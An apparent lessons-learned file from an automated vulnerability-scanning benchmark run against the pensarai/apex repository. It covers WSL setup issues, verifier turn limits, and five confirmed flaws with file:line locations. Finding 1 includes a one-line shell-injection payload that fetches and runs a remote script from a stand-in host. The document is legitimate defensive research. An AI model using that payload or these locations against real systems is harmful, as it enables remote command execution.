# GRENDEL.md — learnings from the remote-bench run on WSL (target: pensarai/apex)

Session date: 2026-07-29. This captures everything learned running the Orion `remote-bench` kit
(the Grendel build + `bench/`) end-to-end against **github.com/pensarai/apex** on a Windows box via
**WSL2 Ubuntu**, so the next run doesn't re-pay the same tuition.

---

## 0. TL;DR result

- **Graph:** 160,814 nodes / 339,405 edges; full build 519.8s (parse 42s, stream-consume 125s,
  persist 33s, GPU semantic index concurrent). apex is TypeScript (447 `.ts`, 67 `.tsx`) → `jssrc`.
- **Discovery:** 6 candidate leads (shapes A:1 B:2 C:1 D:2).
- **Verification (first pass, default budget):** 2 CONFIRM, 1 REJECT, **3 ERROR** — and the 3 ERRORs
  were **`error_max_turns` ("Reached maximum number of turns (10)")**, i.e. the verifier ran out of
  turns, **NOT** rate-limiting and **NOT** rejections.
- **Re-verify (raised budget `ORION_VERIFY_MAX_TURNS=30`, `ORION_VERIFY_TIMEOUT=600`):** all 3 ERROR
  leads → **CONFIRM**.
- **Final: 5 CONFIRMED, 1 REJECTED (false positive correctly filtered), 0 unresolved.**

---

## 1. The box

- Windows 11 host; **WSL2 Ubuntu 24.04.1**, distro user `lutherleo` (matches the repo owner — this is
  effectively the target box mirrored locally).
- **GPU: NVIDIA GTX 1650 Ti, 4 GB VRAM.** Passthrough into WSL works out of the box on driver 592.82
  (`/dev/dxg` + `/usr/lib/wsl/lib/libcuda.so` present, `nvidia-smi` returns instantly).
- systemd is PID 1 in this WSL (so Docker can run as a normal service), 955 GB free, 11 GB RAM.
- **4 GB VRAM is enough** for the jina embedding model: during embedding the GPU sat at **98% util,
  3823/4096 MiB** — tight but no OOM. Don't assume a small card is disqualifying.

## 2. Driving WSL from the Claude Code harness — gotchas

- **Use the Bash tool calling `wsl.exe -d Ubuntu -e bash -c '…'`.** The PowerShell→WSL bridge
  truncated streamed output repeatedly: when any sub-command in a chain hangs, the block-buffered
  pipe never flushes and you get a partial line (e.g. just `internet:`), which looks like a crash but
  isn't. The Bash tool captures WSL output far more reliably.
- **Suppress the TTY noise.** WSL prints `your 131072x1 screen size is bogus. expect trouble` on
  stderr, and it interleaves/corrupts output. Start probe commands with `exec 2>/dev/null` (or
  `export COLUMNS=200 LINES=50`) and strip ANSI with `sed "s/\x1b\[[0-9;]*m//g"` when reading logs.
- **`pgrep -f "setup.sh"` matches your own grep command line** — a "RUNNING" from that is a false
  positive. Check for the actual log file / a real child process instead.
- **Long jobs must run ATTACHED, not `nohup … &` inside a one-shot `wsl -e`.** A detached background
  job launched from a one-shot `wsl.exe -e bash -c "… &"` gets reaped when that invocation returns
  (and WSL can tear the distro down when no session is attached) — it wrote no log and died instantly.
  The fix that worked: run the long command in the **foreground** of a Bash-tool call with
  `run_in_background: true`. The `wsl.exe` process stays attached for the whole duration, keeps the
  distro alive, tees to a log you can tail from other calls, and notifies you on exit.

## 3. Privilege / auth steps only a human can do (and why)

- **`sudo` needed a password**, and `setup.sh` needs root for apt, the Docker install, and Neo4j.
- **The auto-mode classifier blocks piping a password into `sudo`** (`echo … | sudo -S`, and writing
  a `NOPASSWD` sudoers file) — regardless of user authorization. Don't try to obfuscate around it.
- **Interactive prompts (`sudo`, `claude /login`) need a real TTY**, which the harness `!` runner does
  NOT provide — a `! wsl … sudo …` just hangs waiting for a password prompt that never renders.
  → The working path: the **user opens a real WSL terminal window** (Start → "Ubuntu") and runs the
  one privileged line themselves (grant passwordless sudo, or do the apt+docker provisioning). After
  that, all of `setup.sh`'s plain `sudo` calls run unattended.
- **Claude CLI auth** is the same shape: OAuth login is interactive/browser, so the user runs
  `~/.local/bin/claude` in a real terminal once. Verify headlessly afterward with
  `claude -p "reply OK"` → a clean `OK`.

## 4. The transformers-5 / GPU embedding shim (worked as designed)

- `bench/setup.sh` pins **`transformers<5`** (installed 4.57.6, down from 5.14.1) because the jina
  `jina-embeddings-v2-base-code` trust-remote-code model breaks on transformers 5.x.
- `bench/orion_scan.py` aliases `PreTrainedConfig` (5.x name Orion imports) onto `PretrainedConfig`
  (4.x name) **before** Orion imports transformers. This let the model load with **no Orion source
  change**. Confirmed: `torch 2.13.0+cu130 | CUDA available: True | GTX 1650 Ti`, model downloaded its
  `configuration_bert.py`/`modeling_bert.py`, embedded on GPU. The HF "new version downloaded" and
  "optimum is not installed" messages are benign.

## 5. THE key tuning learning — verifier turn budget

- **Default `ORION_VERIFY_MAX_TURNS=10` is too low for complex leads on a real-world repo.** Three
  leads — including the **HIGH-confidence path-traversal→RCE that spans 4 files** — exhausted 10 turns
  mid-derivation and were recorded as `ERROR` (`subtype: error_max_turns`). That is **inconclusive**,
  not a rejection, and it is easy to misread as rate-limiting (it is not: token usage/cost were
  normal, `terminal_reason` was `max_turns`).
- **Fix without touching Orion:** both are env knobs. Re-running just the ERROR leads with
  `ORION_VERIFY_MAX_TURNS=30 ORION_VERIFY_TIMEOUT=600` converted **all 3 → CONFIRM**.
- Added **`bench/reverify.py`**: a bench-side helper that reloads a run's `findings.json`, rebuilds
  the `Lead` objects for a chosen decision (default `ERROR`), and calls the public
  `orion.verify.verify_all(scan_id, leads, repo_path, on_event)` — **reusing the already-built graph
  by `scan_id`**, so you skip the ~25-min build+discover and only re-run verification. Run it FROM the
  repo root (so `--mcp-config .mcp/orion.json` resolves) with `source bench/env.sh` first.
  - Recommendation: for medium/large targets, **export `ORION_VERIFY_MAX_TURNS=25–30` for the whole
    scan** up front, rather than re-verifying after the fact. One verifier session there also hit the
    300s `ORION_VERIFY_TIMEOUT`; 600 gave headroom.

## 6. Findings on pensarai/apex (5 CONFIRM, 1 REJECT)

Scan id `69dd1f145c434646e9d435aecf42ddb74e5e28c5`. Each CONFIRM was independently re-derived against
real source by a separate verifier session (file:line below).

**CONFIRMED**
1. **[HIGH] Shell command injection via unescaped path args** (shape A). `path`/`filePath` tool args
   are spliced unescaped into double-quoted shell strings run by `sandbox.execute(...)`:
   `createFile.ts:46,53-55,116,127,130` (`echo "${base64Content}" | base64 -d > "${filePath}"`),
   `deleteFile.ts:40,54,62`, `applyPatch.ts:233,238,251,253,263`, `updateFile.ts:59,139,177`. The
   traversal guard `resolveUnderCwd` only rejects `..`/absolute, not shell metachars, so
   `foo"; curl evil.sh|sh #` escapes the quotes → arbitrary command exec in the sandbox. Sibling
   `gitStatus.ts:20-25` single-quote-escapes correctly — proving the gap is an oversight.
2. **[MEDIUM] SMTP TLS cert validation disabled (MITM)** (shape C).
   `src/core/agents/offSecAgent/tools/email/sendEmail.ts:137` —
   `tls: smtp.tls ? { rejectUnauthorized: false } : undefined`. TLS-enabled ⇒ cert validation off,
   unconditionally. Reachable EntryPoint handler. (The other 3 `rejectUnauthorized` hits are inert
   regex strings in `whitebox/profiles.ts`.)
3. **[MEDIUM] Insecure OAuth token store** (shape B). `src/core/config/config.ts:84` (init) and `:164`
   (update) write `~/.pensar/config.json` (accessToken/refreshToken) via `fs.writeFile` with **no
   `mode`** and no encryption; contrast `offSecAgent/tools/playwrightMcp.ts:641` which sets
   `mode: 0o600`. Local disclosure of live OAuth tokens.
4. **[LOW] Missing OAuth `state` param — CSRF / auth-code injection** (shape B).
   `scripts/gmail-oauth.ts:33-39,45-59` and `scripts/outlook-oauth.ts:34-41,47-77` build the auth URL
   and run a localhost callback but never generate/verify `state` (RFC 6749 §10.12). LOW because these
   are dev/test helper scripts (limited blast radius), but the defect is real.
5. **[LOW] ReDoS in `COMMAND_PREFIX_STRIP`** (shape D). `src/core/http/targetHeaders.ts:347-348`, used
   by `extractLeadingTool(command)` at `:381` (a reachable EntryPoint with attacker-influenced
   `command`). Nested-quantifier `(…(?:-[^\s]*\s+)*…)+` shape; the verifier **independently reproduced
   pathological backtracking** against the exact regex.

**REJECTED (correct FP filter)**
- **ReDoS in `destructiveGuard.ts` `SQL_STATEMENT_START`** (shape D, `:105`). The verifier showed the
  regex has two *sequential* (not nested) quantifiers ⇒ **O(n²) polynomial**, not exponential
  catastrophic backtracking, and the attacker-control story is contradicted by the code's own
  comments (payloads "never inlined into the command string"). Good discrimination: it CONFIRMED the
  structurally-similar `targetHeaders.ts` ReDoS but REJECTED this one on real analysis.

## 7. Artifacts from this run

- `bench/runs/20260729T094502Z/findings.json` — original 6 verdicts (2 CONFIRM, 1 REJECT, 3 ERROR).
- `bench/runs/20260729T094502Z/reverify.json` — the 3 recovered CONFIRMs.
- `bench/runs/20260729T094502Z/report.log` — ranked human-readable report.
- `.orion/runs/69dd…/…/progress.jsonl` — structured per-event timeline.
- `bench/reverify.py` — the new re-verify helper (added this session; no Orion source changed).
